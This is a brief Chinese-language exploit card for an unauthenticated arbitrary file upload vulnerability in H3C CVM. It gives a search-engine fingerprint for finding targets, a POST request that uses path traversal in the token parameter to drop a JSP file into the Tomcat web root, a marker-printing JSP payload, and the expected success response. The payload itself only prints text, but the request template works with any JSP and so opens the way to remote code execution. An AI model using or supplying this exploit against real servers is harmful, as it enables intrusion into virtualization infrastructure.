# H3CCVM前台任意文件上传漏洞

H3CCVM ｜ 文件上传 ｜ —
- **指纹**：`app="H3C-CVM"`
- **请求**：`POST /cas/fileUpload/upload?token=/../../../../../var/lib/tomcat8/webapps/cas/js/lib/buttons/dudesuite.jsp&name=123 HTTP/1.1`

**Payload**
```
<%out.println("dudesuite");%>
```
- **响应特征**：200 success